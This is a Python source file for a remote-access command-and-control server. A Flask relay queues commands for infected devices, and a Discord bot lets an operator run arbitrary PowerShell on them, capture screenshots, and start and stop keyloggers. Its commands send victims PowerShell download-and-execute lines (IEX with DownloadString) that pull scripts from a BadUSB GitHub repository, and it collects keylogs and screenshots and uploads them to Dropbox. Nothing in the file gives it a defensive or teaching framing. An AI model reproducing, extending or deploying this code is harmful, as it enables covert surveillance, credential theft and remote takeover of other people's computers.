import threading
import queue
import time
import requests
import os
import glob
import discord
from discord.ext import commands
import asyncio
import dropbox
from flask import Flask, request, jsonify
from datetime import datetime



# --- Flask Relay Server ---
app = Flask(__name__)
device_last_seen = {}
device_queues = {}
device_results = {}
device_channels = {}  # device_id -> {'session': id, 'screenshot': id}
keylogger_stop_flags = {}  # device_id -> True/False

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# -- Image
C2_IMAGE_PATH = "c2.jpg" 
# --- Dropbox ---
SAVE_TO_DROPBOX = True

def upload_to_dropbox(local_path, dropbox_path):
    dbx = dropbox.Dropbox(DROPBOX_TOKEN)
    with open(local_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode.overwrite)

async def send_dropbox_status(latest_file, device_id, channel, dropbox_path=None):
    """Uploads the file to /upload and sends Dropbox status to the given Discord channel."""
    data = {"device_id": device_id}
    if dropbox_path:
        data["dropbox_path"] = dropbox_path
    with open(latest_file, "rb") as f:
        response = requests.post(
            "http://localhost:5000/upload",
            files={"file": (os.path.basename(latest_file), f)},  # Pass filename
            data=data
        )
    dropbox_status = response.json().get("dropbox")
    if dropbox_status == "success":
        await channel.send("✅ Successfully uploaded to Dropbox.")
    elif dropbox_status and str(dropbox_status).startswith("failed"):
        await channel.send(f"❌ Dropbox upload failed: {dropbox_status}")
    else:
        await channel.send("ℹ️ Dropbox upload status unknown.")

def send_command_to_device(device_id, command):
    """Send a command to a device via the relay server."""
    requests.post("http://localhost:5000/send_command", json={
        "device_id": device_id,
        "command": command
    })

def wait_for_new_file(pattern, prev_files, timeout=60, interval=2):
    """Wait for a new file matching pattern to appear."""
    for _ in range(timeout // interval):
        files = set(glob.glob(pattern))
        new_files = files - prev_files
        if new_files:
            return max(new_files, key=os.path.getmtime)
        time.sleep(interval)
    return None

def build_screenshot_embed(device_id, filename="screenshot.png"):
    embed = discord.Embed(
        title=f"Screenshot from `{device_id}`",
        description="Here is the latest screenshot:",
        color=discord.Color.red()
    )
    embed.set_image(url=f"attachment://{filename}")
    return embed

async def send_screenshot_and_status(channel, latest_file, device_id):
    """Send screenshot and Dropbox status to a Discord channel."""
    file = discord.File(latest_file, filename="screenshot.png")
    embed = build_screenshot_embed(device_id)
    await channel.send(embed=embed, file=file)
    if SAVE_TO_DROPBOX:
        await send_dropbox_status(latest_file, device_id, channel)
    else:
        await channel.send("ℹ️ Dropbox upload is disabled.")

    os.remove(latest_file)


# --- Flask Endpoints ---
@app.route('/poll', methods=['POST'])
def poll():
    device_id = request.json.get('device_id')
    device_last_seen[device_id] = time.time()
    if device_id not in device_queues:
        device_queues[device_id] = queue.Queue()
    try:
        command = device_queues[device_id].get_nowait()
    except queue.Empty:
        command = None
    return jsonify({'command': command})

@app.route('/result', methods=['POST'])
def result():
    device_id = request.json.get('device_id')
    result = request.json.get('result')
    device_results[device_id] = result
    print(f"Result from {device_id}: {result}")
    return jsonify({'status': 'ok'})

@app.route('/send_command', methods=['POST'])
def send_command():
    device_id = request.json.get('device_id')
    command = request.json.get('command')
    if device_id not in device_queues:
        device_queues[device_id] = queue.Queue()
    device_queues[device_id].put(command)
    return jsonify({'status': 'queued'})

@app.route('/get_result', methods=['GET'])
def get_result():
    device_id = request.args.get('device_id')
    result = device_results.get(device_id)
    return jsonify({'result': result})

@app.route('/register', methods=['POST'])
def register():
    device_id = request.json.get('device_id')
    device_channels[device_id] = None  # Mark for channel creation
    device_last_seen[device_id] = time.time()
    print(f"Device registered: {device_id}")
    # Notify in all session channels (or a global channel if you prefer)
    try:
        # Wait for Discord bot to be ready and channels to exist
        channel_id = None
        # Try to get the session channel for this device
        if isinstance(device_channels.get(device_id), dict):
            channel_id = device_channels[device_id].get('session')
        if channel_id:
            channel = bot.get_channel(channel_id)
            if channel:
                asyncio.run_coroutine_threadsafe(
                    channel.send(f"🟢 `{device_id}` has connected!"),
                    bot.loop
                )
    except Exception as e:
        print(f"Error sending connect message: {e}")
    return jsonify({'status': 'registered'})

@app.route('/upload', methods=['POST'])
def upload():
    device_id = request.form.get('device_id')
    file = request.files.get('file')
    dropbox_path = request.form.get('dropbox_path')  # <-- NEW
    if not device_id or not file:
        return jsonify({'status': 'error', 'reason': 'Missing device_id or file'}), 400
    filename = file.filename  # Use the filename sent by the bot/agent
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)
    print(f"Received screenshot from {device_id}, saved to {save_path}")
    # Optionally upload to Dropbox
    dropbox_status = None
    if SAVE_TO_DROPBOX:
        # Use custom dropbox_path if provided, else default
        if not dropbox_path:
            dropbox_path = f"/{device_id}_screenshot{i}.png"
        try:
            upload_to_dropbox(save_path, dropbox_path)
            print(f"Uploaded {save_path} to Dropbox at {dropbox_path}")
            dropbox_status = "success"
        except Exception as e:
            print(f"Dropbox upload failed: {e}")
            dropbox_status = f"failed: {e}"
    return jsonify({
        'status': 'uploaded',
        'filename': os.path.basename(save_path),
        'dropbox': dropbox_status
    })

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'ok'}), 200

@app.route('/upload_keylog', methods=['POST'])
def upload_keylog():
    device_id = request.form.get('device_id') or request.form.get('d')
    file = request.files.get('file1') or request.files.get('f1')
    if not device_id or not file:
        return jsonify({'status': 'error', 'reason': 'Missing device_id or file'}), 400
    filename = file.filename
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)
    print(f"Received keylog from {device_id}, saved to {save_path}")

    # Try to get the keylog channel for this device
    channel_id = None
    if isinstance(device_channels.get(device_id), dict):
        channel_id = device_channels[device_id].get('keylog')
        
    if channel_id:
        channel = bot.get_channel(channel_id)
        if channel:
            asyncio.run_coroutine_threadsafe(
                channel.send(file=discord.File(save_path, filename=filename)),
                bot.loop
            )
    else:
        print(f"No keylog channel found for {device_id}")
    return jsonify({'status': 'uploaded', 'filename': filename})

@app.route('/should_stop_keylogger', methods=['GET'])
def should_stop_keylogger():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({'stop': False})
    stop = keylogger_stop_flags.get(device_id, False)
    return jsonify({'stop': stop})

def run_flask():
    app.run(host='0.0.0.0', port=5000)


# --- Discord Bot ---
CATEGORY_PREFIX = "Device-"
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!C2 ", intents=intents, help_command=None)

def get_device_result(device_id):
    try:
        resp = requests.get("http://localhost:5000/get_result", params={"device_id": device_id})
        return resp.json().get("result")
    except Exception as e:
        return f"Error fetching result: {e}"

async def create_category_and_channel(guild, device_id):
    category_name = f"{CATEGORY_PREFIX}{device_id}"
    category = discord.utils.get(guild.categories, name=category_name)
    if not category:
        category = await guild.create_category(category_name)

    # Create or get session channel
    session_channel = discord.utils.get(category.channels, name="session")
    if not session_channel:
        session_channel = await guild.create_text_channel("session", category=category)

    # Create or get powershell channel
    powershell_channel = discord.utils.get(category.channels, name="powershell")
    if not powershell_channel:
        powershell_channel = await guild.create_text_channel("powershell", category=category)

    # Create or get screenshot channel
    screenshot_channel = discord.utils.get(category.channels, name="screenshot")
    if not screenshot_channel:
        screenshot_channel = await guild.create_text_channel("screenshot", category=category)

    # --- Create or get keylog channel ---
    keylog_channel = discord.utils.get(category.channels, name="keylog")
    if not keylog_channel:
        keylog_channel = await guild.create_text_channel("keylog", category=category)

    device_channels[device_id] = {
        'session': session_channel.id,
        'powershell': powershell_channel.id,
        'screenshot': screenshot_channel.id,
        'keylog': keylog_channel.id  # <-- Add keylog channel ID
    }
    
    print(f"Created category and channels for {device_id}: session={session_channel.id}, powershell={powershell_channel.id}, screenshot={screenshot_channel.id}, keylog={keylog_channel.id}")
    
    await session_channel.send(f"🟢 `{device_id}` has connected!")
    return session_channel.id, powershell_channel.id, screenshot_channel.id, keylog_channel.id

async def device_channel_watcher():
    await bot.wait_until_ready()
    while not bot.is_closed():
        if not bot.guilds:
            await asyncio.sleep(5)
            continue
        guild = bot.guilds[0]
        for device_id, channels in list(device_channels.items()):
            if channels is None or not isinstance(channels, dict):
                await create_category_and_channel(guild, device_id)
        await asyncio.sleep(5)

async def device_disconnect_watcher():
    await bot.wait_until_ready()
    disconnect_timeout = 60  # seconds of inactivity to consider disconnected
    while not bot.is_closed():
        now = time.time()
        for device_id, last_seen in list(device_last_seen.items()):
            if now - last_seen > disconnect_timeout:
                # Only notify once per disconnect
                if device_last_seen[device_id] != -1:
                    channel_id = None
                    if isinstance(device_channels.get(device_id), dict):
                        channel_id = device_channels[device_id].get('session')
                    if channel_id:
                        channel = bot.get_channel(channel_id)
                        if channel:
                            await channel.send(f"🔴 `{device_id}` has disconnected!")
                    device_last_seen[device_id] = -1  # Mark as notified
        await asyncio.sleep(10)


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command(name="devices")
async def devices_command(ctx):
    if device_channels:
        device_list = "\n".join(f"- `{dev}`" for dev in device_channels)
        embed = discord.Embed(
            title="Registered Devices",
            description=device_list,
            color=discord.Color.red()
        )
        embed.set_image(url=f"attachment://{os.path.basename(C2_IMAGE_PATH)}")
        with open(C2_IMAGE_PATH, "rb") as f:
            file = discord.File(f, filename=os.path.basename(C2_IMAGE_PATH))
            await ctx.send(embed=embed, file=file)
    else:
        embed = discord.Embed(
            title="Registered Devices",
            description='No devices registered yet.',
            color=discord.Color.red()
        )
        embed.set_image(url=f"attachment://{os.path.basename(C2_IMAGE_PATH)}")
        with open(C2_IMAGE_PATH, "rb") as f:
            file = discord.File(f, filename=os.path.basename(C2_IMAGE_PATH))
            await ctx.send(embed=embed, file=file)

@bot.command(name="help")
async def c2help_command(ctx):
    help_text = (
        "**C2 Bot Help**\n"
        "`!C2 help` - Show this help message\n"
        "`!C2 devices` - List all registered devices\n"
        "`!C2 PS <command>` - Run PowerShell command on this device (in #powershell channel)\n"
        "`!C2 screenshot` - Take a screenshot and post in #screenshot channel (in #screenshot channel)\n"
        "`!C2 setC2image` - Change the C2 image by uploading a new file\n"
        "`!C2 toggledropbox [on/off]` - Enable or disable Dropbox uploads\n"
    )
    embed = discord.Embed(
        title = "C2 Bot Help",
        description = help_text,
        color = discord.Color.red()
    )
    embed.set_image(url=f"attachment://{os.path.basename(C2_IMAGE_PATH)}")
    with open(C2_IMAGE_PATH, "rb") as f:
        file = discord.File(f, filename=os.path.basename(C2_IMAGE_PATH))
        await ctx.send(embed=embed, file=file)

@bot.command(name="screenshot")
async def screenshot_command(ctx):
    for device_id, channels in device_channels.items():
        if isinstance(channels, dict) and ctx.channel.id == channels['screenshot']:
            screenshot_channel = bot.get_channel(channels['screenshot'])
            screenshot_ps = (
                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoshuaBrien/BadUSB/refs/heads/main/Windows%2011/commands/capturescreenonce.ps1')"
            )
            send_command_to_device(device_id, screenshot_ps)
            await ctx.send(f"Requested screenshot from `{device_id}`. Awaiting upload...")

            # Record the time of request
            request_time = time.time()
            pattern_jpg = os.path.join(UPLOAD_FOLDER, f"{device_id}_*.jpg")
            pattern_png = os.path.join(UPLOAD_FOLDER, f"{device_id}_*.png")
            patterns = [pattern_jpg, pattern_png]

            timeout = 60
            interval = 2
            latest_file = None
            used_filename = None

            for _ in range(timeout // interval):
                candidates = []
                for pattern in patterns:
                    candidates += glob.glob(pattern)
                # Filter for files created after the request
                candidates = [f for f in candidates if os.path.getmtime(f) >= request_time]
                if candidates:
                    latest_file = max(candidates, key=os.path.getmtime)
                    used_filename = os.path.basename(latest_file)
                    break
                await asyncio.sleep(interval)

            if latest_file:
                file = discord.File(latest_file, filename=used_filename)
                embed = build_screenshot_embed(device_id, used_filename)
                await screenshot_channel.send(embed=embed, file=file)
                # Dropbox upload status
                if SAVE_TO_DROPBOX:
                    dropbox_path = f"/{device_id}/screenshot/{used_filename}"
                    await send_dropbox_status(latest_file, device_id, screenshot_channel, dropbox_path)
                else:
                    await screenshot_channel.send("ℹ️ Dropbox upload is disabled.")
                os.remove(latest_file)
            else:
                await ctx.send(f"No screenshot received from `{device_id}` after 60 seconds.")
            break

@bot.command(name="setC2image")
async def set_c2_image(ctx):
    """Change the C2 image by uploading a new file."""
    if not ctx.message.attachments:
        await ctx.send("Please attach an image file to use as the new C2 image.")
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
        await ctx.send("Only image files are allowed.")
        return
    save_path = os.path.join(BASE_DIR, "c2.jpg")
    await attachment.save(save_path)
    global C2_IMAGE_PATH
    C2_IMAGE_PATH = save_path
    await ctx.send(f"✅ C2 image updated to `{attachment.filename}`.")

    # Upload to Dropbox under /c2/images/<imagename>
    if SAVE_TO_DROPBOX:
        dropbox_path = f"/c2/images/{attachment.filename}"
        await send_dropbox_status(save_path, "c2", ctx.channel, dropbox_path)
    else:
        await ctx.send("ℹ️ Dropbox upload is disabled.")

@bot.command(name="PS")
async def ps_command(ctx, *, command: str):
    # Find the device for this channel
    for device_id, channels in device_channels.items():
        if isinstance(channels, dict) and ctx.channel.id == channels['powershell']:
            send_command_to_device(device_id, command)
            await ctx.send(f"Command sent to `{device_id}`: `{command}`")
            # Poll for result (wait up to 30 seconds)
            for _ in range(60):
                result = get_device_result(device_id)
                if result:
                    await ctx.send(f"Result from `{device_id}`:\n```{result[:1900]}```")
                    break
                await asyncio.sleep(15)
            else:
                await ctx.send(f"No result from `{device_id}` after 30 seconds.")
            break
    else:
        await ctx.send("This command can only be used in a device's powershell channel.")

@bot.command(name="toggledropbox")
@commands.has_permissions(administrator=True)
async def toggle_dropbox(ctx, state: str = None):
    """
    Toggle Dropbox uploads on or off.
    Usage: !C2 toggledropbox [on/off]
    """
    global SAVE_TO_DROPBOX
    if state is None:
        await ctx.send(f"Dropbox upload is currently {'enabled' if SAVE_TO_DROPBOX else 'disabled'}.")
        return
    if state.lower() in ["on", "true", "enable", "enabled"]:
        SAVE_TO_DROPBOX = True
        await ctx.send("✅ Dropbox upload is now ENABLED.")
    elif state.lower() in ["off", "false", "disable", "disabled"]:
        SAVE_TO_DROPBOX = False
        await ctx.send("❌ Dropbox upload is now DISABLED.")
    else:
        await ctx.send("Usage: `!C2 toggledropbox [on/off]`")

@bot.command(name="keycapture")
async def keycapture_command(ctx):
    for device_id, channels in device_channels.items():
        if isinstance(channels, dict) and ctx.channel.id == channels['keylog']:
            # Replace the URL with your actual hosted script location
            keylogger_ps = (
                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoshuaBrien/BadUSB/refs/heads/main/Windows%2011/commands/conhost_capturenew.ps1')"
            )
            send_command_to_device(device_id, keylogger_ps)
            await ctx.send(f"Requested key capture from `{device_id}`. Awaiting upload...")
            break
    else:
        await ctx.send("This command can only be used in a device's keylog channel.")

@bot.command(name="stopkeycapture")
async def stopkeycapture_command(ctx):
    for device_id, channels in device_channels.items():
        if isinstance(channels, dict) and ctx.channel.id == channels['keylog']:
            keylogger_stop_flags[device_id] = True
            await ctx.send(f"🛑 Stop signal sent to keylogger on `{device_id}`.")
            break
    else:
        await ctx.send("This command can only be used in a device's keylog channel.")

@bot.command(name="startkeycapture")
async def startkeycapture_command(ctx):
    for device_id, channels in device_channels.items():
        if isinstance(channels, dict) and ctx.channel.id == channels['keylog']:
            keylogger_stop_flags[device_id] = False
            await ctx.send(f"▶️ Start signal sent to keylogger on `{device_id}`.")
            break
    else:
        await ctx.send("This command can only be used in a device's keylog channel.")


@bot.event
async def on_message(message):
    await bot.process_commands(message)

    

# --- Startup ---
BOT_TOKEN = os.getenv('BOT_TOKEN') # Get token from environment variable
DROPBOX_TOKEN = os.getenv('DROPBOX_TOKEN')  # Or paste your token directly (not recommended for production)
if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    async def setup_hook():
        asyncio.create_task(device_channel_watcher())
        asyncio.create_task(device_disconnect_watcher())  # Start disconnect watcher
    bot.setup_hook = setup_hook
    bot.run(BOT_TOKEN)

